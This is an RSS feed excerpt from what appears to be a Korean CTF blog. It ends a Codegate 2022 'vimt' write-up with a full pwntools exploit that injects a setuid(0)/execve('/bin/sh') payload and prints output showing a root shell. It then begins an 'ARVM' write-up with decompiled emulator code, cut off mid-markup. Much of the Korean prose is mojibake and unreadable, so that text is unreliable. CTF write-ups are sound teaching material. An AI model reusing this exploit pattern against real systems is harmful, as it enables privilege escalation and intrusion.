ë°©ë²•ìœ¼ë¡œ ì…ë ¥í•œ í›„ <code>map</code> ë°°ì—´ì˜ ìƒíƒœëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. ì»¤ì„œëŠ” <code>map[0][41]</code> ì— ìœ„ì¹˜í•˜ê³  ìˆìœ¼ë©°, <code>map[0]</code> ì˜ ì½”ë“œ ë’·ë¶€ë¶„, <code>map[1]</code> ì— ê±°ì³ ëœë¤í•œ ë¬¸ìë“¤ì´ ë§ì´ ë‚¨ì•„ìˆëŠ” ìƒí™©ì…ë‹ˆë‹¤.</p><p><img src="/images/codegate22-vimt/7.png" alt="7.png"></p><p>ê·¸ëŸ°ë° ì½”ë“œì˜ ê¸¸ì´ê°€ ì •í™•íˆ 41ë°”ì´íŠ¸ì´ë¯€ë¡œ, í˜„ì¬ ì»¤ì„œ ìœ„ì¹˜ì—ì„œ ì•„ë¬´ ë¬¸ì í•˜ë‚˜ë¥¼ ì…ë ¥í•œ í›„(ì‹¤ì œë¡œëŠ” 6ê°œê°€ ì…ë ¥ë©ë‹ˆë‹¤) Backspaceë¥¼ ì…ë ¥í•˜ì—¬ <code>deleteKey</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ <code>map[0]</code> ì˜ ë’·ë¶€ë¶„ì— ìœ„ì¹˜í•œ ëœë¤í•œ ë¬¸ìëŠ” ëª¨ë‘ ì§€ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë‹¤ìŒ ê·¸ë¦¼ì—ì„œ ë¶‰ì€ ë¬¸ìëŠ” ì…ë ¥ í›„ Backspaceì— ì§€ì›Œì§€ëŠ” ë¬¸ìë“¤ì…ë‹ˆë‹¤. <code>inputKey</code> í•¨ìˆ˜ì—ì„œ ì¤„ë°”ê¿ˆì€ ìƒˆë¡œìš´ ë¬¸ìë¥¼ ì…ë ¥ë°›ê¸° ì „ ì´ì „ ì…ë ¥ì— ëŒ€í•œ <code>cur_x</code> ê°’ì˜ ë³€í™”ë¥¼ ê¸°ì¤€ìœ¼ë¡œ ìˆ˜í–‰í•©ë‹ˆë‹¤. <code>inputKey</code> í•¨ìˆ˜ê°€ ë¦¬í„´í•œ ì´í›„ <code>deleteKey</code> í•¨ìˆ˜ í˜¸ì¶œ ì‹œì ì—ì„œ ì»¤ì„œì˜ ìœ„ì¹˜ëŠ” ì¤„ë°”ê¿ˆì´ ì•„ì§ ì¼ì–´ë‚˜ì§€ ì•Šì€ <code>map[0][47]</code> ì´ë¯€ë¡œ, ëœë¤í•œ ë¬¸ìë§Œ ê¹”ë”í•˜ê²Œ ì§€ìš¸ ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.</p><p><img src="/images/codegate22-vimt/8.png" alt="8.png"></p><p>ì´í›„ â€œset y 1â€ ì»¤ë§¨ë“œë¡œ ì»¤ì„œì˜ ìœ„ì¹˜ë¥¼ <code>map[1][41]</code> ë¡œ ì˜®ê¸´ í›„, ë™ì¼í•˜ê²Œ ì•„ë¬´ ë¬¸ì í•˜ë‚˜ë¥¼ ì…ë ¥í•˜ê³  Backspaceë¥¼ 8ë²ˆ ì…ë ¥í•˜ë©´ <code>map[1]</code> ì˜ ëª¨ë“  ë¬¸ìë¥¼ ì§€ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ì œ ì˜ë„í–ˆë˜ ëŒ€ë¡œ ì •í™•íˆ ì†ŒìŠ¤ ì½”ë“œë§Œ ì…ë ¥ë˜ì—ˆìŠµë‹ˆë‹¤. â€œcompileâ€ ì»¤ë§¨ë“œë¡œ ë°”ì´ë„ˆë¦¬ë¥¼ ì»´íŒŒì¼í•œ í›„ ì‹¤í–‰í•˜ë©´ root ê¶Œí•œì˜ ì…¸ì„ íšë“í•˜ê²Œ ë©ë‹ˆë‹¤.</p><p><img src="/images/codegate22-vimt/9.png" alt="9.png"></p><p>ë‹¤ìŒì€ ìœ„ì˜ ë‚´ìš©ì„ ë°”íƒ•ìœ¼ë¡œ ì‘ì„±í•œ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œì…ë‹ˆë‹¤. 4í–‰ì€ <code>sshpass</code> ì»¤ë§¨ë“œë¡œ SSH ì ‘ì†ì„ ìˆ˜í–‰í•˜ê³ , 35í–‰ì€ ì„œë²„ì—ì„œ <code>stty</code> ì»¤ë§¨ë“œë¡œ ê°€ìƒ í„°ë¯¸ë„ì˜ ê°€ë¡œì™€ ì„¸ë¡œ í¬ê¸°ë¥¼ ì§€ì •í•©ë‹ˆë‹¤. ì…ë ¥í•  ì½”ë“œë¥¼ ì „ì†¡í•˜ëŠ” ê³¼ì •ì—ì„œ ìˆœì„œê°€ ê¼¬ì—¬ ì‹¤íŒ¨í•˜ëŠ” ê²½ìš°ê°€ ìˆëŠ”ë°, ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ ëª‡ ë²ˆ ì‹¤í–‰í•˜ë©´ root ê¶Œí•œì˜ ì…¸ì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;sshpass -e ssh -tt ctf@localhost -p 1234 &#x27;bash -i&#x27;&quot;</span>,</span><br><span class="line">            shell=<span class="literal">True</span>, env=&#123;<span class="string">&quot;SSHPASS&quot;</span>: <span class="string">&quot;ctf1234_smiley&quot;</span>&#125;)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_axis</span>(<span class="params">n</span>):</span><br><span class="line">    r.send(<span class="string">b&quot;\x1b&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;set y &quot;</span> + <span class="built_in">str</span>(n).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_key</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        r.send(p8(c))</span><br><span class="line">    set_axis(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    set_axis(<span class="number">0</span>)</span><br><span class="line">    r.send(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    r.send(<span class="string">b&quot;\x7f&quot;</span>)</span><br><span class="line">    set_axis(<span class="number">1</span>)</span><br><span class="line">    r.send(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        r.send(<span class="string">b&quot;\x7f&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compile</span>():</span><br><span class="line">    r.send(<span class="string">b&quot;\x1b&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;compile&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;~$&quot;</span>, <span class="string">b&quot;stty cols 47 rows 4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;~$&quot;</span>, <span class="string">b&quot;./app&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;main() &#123;setuid(0);execve(\&quot;/bin/sh\&quot;,0,0);&#125;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> payload:</span><br><span class="line">        input_key(c)</span><br><span class="line"></span><br><span class="line">    clean()</span><br><span class="line">    <span class="built_in">compile</span>()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ ./ex.py</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">    b<span class="string">&#x27;-----------------------------------------------main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;      \r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;                                               \r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;-----------------------------------------------\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&quot;:compiletmp/c7fd17d084a218713d385deb3df85bd1.c:1:1: warning: return type defaults to &#x27;int&#x27; [-Wimplicit-int]\r\n&quot;</span></span><br><span class="line">    b<span class="string">&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;      | ^~~~\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c: In function &#x27;main&#x27;:\r\n&quot;</span></span><br><span class="line">    b<span class="string">&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c:1:9: warning: implicit declaration of function &#x27;setuid&#x27; [-Wimplicit-function-declaration]\r\n&quot;</span></span><br><span class="line">    b<span class="string">&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;      |         ^~~~~~\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c:1:19: warning: implicit declaration of function &#x27;execve&#x27; [-Wimplicit-function-declaration]\r\n&quot;</span></span><br><span class="line">    b<span class="string">&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;      |                   ^~~~~~\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;# &#x27;</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># $ id</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b<span class="string">&#x27;id\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x4 bytes:</span><br><span class="line">    b<span class="string">&#x27;id\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">[DEBUG] Received 0x2c bytes:</span><br><span class="line">    b<span class="string">&#x27;uid=0(root) gid=1000(ctf) groups=1000(ctf)\r\n&#x27;</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Security/">Security</category>
      
      <category domain="https://juhyun167.github.io/categories/Security/CTF/">CTF</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/07/05/codegate22-vimt/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Codegate CTF 2022] ARVM</title>
      <link>https://juhyun167.github.io/2022/07/03/codegate22-arvm/</link>
      <guid>https://juhyun167.github.io/2022/07/03/codegate22-arvm/</guid>
      <pubDate>Sun, 03 Jul 2022 11:26:07 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;%EA%B0%9C%EC%9A%94&quot; tabindex=&quot;-1&quot;&gt;ê°œìš”&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome! Here is my Emulator. It can use only human.&lt;br&gt;
Always SMiLEY ğŸ˜ƒ&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">ê°œìš”</h2><blockquote><p>Welcome! Here is my Emulator. It can use only human.<br>Always SMiLEY ğŸ˜ƒ</p></blockquote><p><a href="/uploads/codegate22-arvm/chall.zip">chall.zip</a></p><h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">ë¬¸ì œ ë¶„ì„</h2><p>32ë¹„íŠ¸ ARM ë°”ì´ë„ˆë¦¬ <code>app</code> ê³¼ <code>Dockerfile</code> , <code>run.sh</code> ë“±ì´ ì£¼ì–´ì§‘ë‹ˆë‹¤. <code>run.sh</code> íŒŒì¼ì—ì„œ ë°”ì´ë„ˆë¦¬ëŠ” <code>qemu-arm-static</code> ìœ¼ë¡œ ì—ë®¬ë ˆì´ì…˜í•˜ì—¬ ì‹¤í–‰ë¨ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°”ì´ë„ˆë¦¬ëŠ” ì‹¬ë³¼ì´ stripë˜ì–´ ìˆê³ , NX, canary ë³´í˜¸ ê¸°ë²•ì´ ì ìš©ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec app</span><br><span class="line">[*] <span class="string">&#x27;/home/user/study/ctf/codegate22/arvm/app&#x27;</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure><p>ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´ ì½”ë“œë¥¼ ì…ë ¥ë°›ê³ , 3ê°€ì§€ì˜ ë©”ë‰´ê°€ ì£¼ì–´ì§‘ë‹ˆë‹¤. ì½”ë“œë¥¼ ì…ë ¥í•˜ê³  '1. Run Codeâ€™ë¥¼ ì„ íƒí•˜ë©´ ë°”ì´ë„ˆë¦¬ê°€ ì¶œë ¥í•˜ëŠ” Secret codeë¥¼ ë˜‘ê°™ì´ ì…ë ¥í•´ì•¼ í•˜ëŠ”ë°, ì•ì„œ ì½”ë“œë¡œ â€œ111â€ ì„ ì…ë ¥í–ˆë”ë‹ˆ â€œInstruction 0xa31313131 is invalidâ€ ë©”ì‹œì§€ì™€ í•¨ê»˜ ì¢…ë£Œë©ë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-arm-static -L /usr/arm-linux-gnueabi ./app</span><br><span class="line">Running Emulator...</span><br><span class="line">Welcome Emulator</span><br><span class="line">Insert Your Code :&gt; 111</span><br><span class="line">1. Run Code</span><br><span class="line">2. View Code</span><br><span class="line">3. Edit Code</span><br><span class="line">:&gt; 1</span><br><span class="line">Before run, it has some captcha</span><br><span class="line">Secret code : 0x52bae0cd</span><br><span class="line">Code? :&gt; 0x52bae0cd</span><br><span class="line">Instruction 0xa313131 is invalid</span><br></pre></td></tr></table></figure><p><code>main</code> í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. 13í–‰ì—ì„œ <code>setup</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ í•„ìš”í•œ êµ¬ì¡°ì²´ì™€ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ê³ , 17í–‰ì—ì„œ <code>edit_code</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ì½”ë“œë¥¼ ì…ë ¥ë°›ìŠµë‹ˆë‹¤. 53í–‰ì—ì„œ í˜¸ì¶œí•˜ëŠ” <code>check_code</code> í•¨ìˆ˜ì˜ ë¦¬í„´ê°’ì´ -1ì´ ì•„ë‹ˆë©´ 56~61í–‰ì—ì„œ ì…ë ¥í•œ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ”ë°, <code>R0</code> ë¶€í„° <code>R12</code> ê¹Œì§€ ëª¨ë‘ 0ìœ¼ë¡œ ì´ˆê¸°í™”í•˜ëŠ” ì½”ë“œë¥¼ ì•ì— ë§ë¶™ì¸ í›„ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> captcha; <span class="comment">// [sp+4h] [bp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [sp+8h] [bp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [sp+Ch] [bp-28h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [sp+10h] [bp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [sp+14h] [bp-20h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [sp+1Ch] [bp-18h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// [sp+2Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = &amp;_stack_chk_guard;</span><br><span class="line">  <span class="keyword">if</span> ( setup() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( loading() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( edit_code() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu();</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">16u</span>);</span><br><span class="line">    choice = atoi(s);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">1</span> )                          <span class="comment">// 1. Run Code</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">2</span> )                          <span class="comment">// 2. View Code</span></span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, em-&gt;code, <span class="number">4096u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">3</span> )                     <span class="comment">// 3. Edit Code</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( loading() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( edit_code() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  captcha = <span class="number">0</span>;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  read(fd, &amp;captcha, <span class="number">4u</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Before run, it has some captcha&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Secret code : 0x%x\n&quot;</span>, captcha);</span><br><span class="line">  input = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Code? :&gt; &quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;0x%x&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( captcha != input )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are Robot!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( check_code() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good! Now Execute Real Machine&quot;</span>);</span><br><span class="line">  dest = <span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, em-&gt;code, <span class="number">4096u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(em-&gt;code, <span class="number">0</span>, <span class="number">4096u</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(em-&gt;code, &amp;clear_regs_code, <span class="number">52u</span>);      <span class="comment">// mov &#123;r0-r12&#125;, 0</span></span><br><span class="line">  v0 = <span class="built_in">memcpy</span>(em-&gt;code + <span class="number">52</span>, dest, <span class="number">4044u</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">void</span> *))em-&gt;code)(v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>setup</code> í•¨ìˆ˜ëŠ” <code>emulator</code> êµ¬ì¡°ì²´ ë³€ìˆ˜ <code>em</code> ê³¼ <code>reg</code> êµ¬ì¡°ì²´, ê°ì¢… ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤. <code>emulator</code> êµ¬ì¡°ì²´ëŠ” <code>mmap</code> ì‹œìŠ¤í…œ ì½œë¡œ í• ë‹¹í•œ ì½”ë“œ, í™, ìŠ¤íƒ ì—­í• ì„ í•˜ëŠ” ë©”ëª¨ë¦¬ì˜ ì£¼ì†Œì™€ <code>reg</code> êµ¬ì¡°ì²´ í¬ì¸í„°ë¥¼ ë©¤ë²„ë¡œ ê°€ì§‘ë‹ˆë‹¤. <code>reg</code> êµ¬ì¡°ì²´ëŠ” ë²”ìš© ë ˆì§€ìŠ¤í„°ë“¤ê³¼ <code>CPSR</code> ë ˆì§€ìŠ¤í„° ì—­í• ì„ í•˜ëŠ” ì •ìˆ˜í˜• ë³€ìˆ˜ 17ê°œë¥¼ ë©¤ë²„ë¡œ ê°€ì§‘ë‹ˆë‹¤. í• ë‹¹ ì´í›„ <code>em-&gt;reg-&gt;pc</code> , <code>em-&gt;reg-&gt;sp</code> ë¥¼ ê°ê° <code>em-&gt;code</code> , <code>em-&gt;stack</code> ìœ¼ë¡œ ì´ˆê¸°í™”í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setup</span><span class="params">()</span> <span class="comment">// 0x1088c</span></span><br><span class="line">&#123;</span><br><span class="line">  emulator *v1; <span class="comment">// r4</span></span><br><span class="line">  emulator *v2; <span class="comment">// r4</span></span><br><span class="line">  emulator *v3; <span class="comment">// r4</span></span><br><span class="line">  emulator *v4; <span class="comment">// r4</span></span><br><span class="line"></span><br><span class="line">  setvbuf((FILE *)<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf((FILE *)<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  em = (emulator *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">16u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v1 = em;</span><br><span class="line">  v1-&gt;code = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x1000</span>, <span class="number">4096u</span>, <span class="number">7</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;code )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v2 = em;</span><br><span class="line">  v2-&gt;heap = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x2000</span>, <span class="number">4096u</span>, <span class="number">3</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;heap )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v3 = em;</span><br><span class="line">  v3-&gt;<span class="built_in">stack</span> = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x3000</span>, <span class="number">4096u</span>, <span class="number">3</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;<span class="built_in">stack</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v4 = em;</span><br><span class="line">  v4-&gt;reg = (<span class="keyword">struct</span> reg *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">68u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;reg )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  em-&gt;reg-&gt;pc = (<span class="type">unsigned</span> <span class="type">int</span>)em-&gt;code;</span><br><span class="line">  em-&gt;reg-&gt;sp = (<span class="type">unsigned</span> <span class="type">int</span>)em-&gt;<span class="built_in">stack</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure 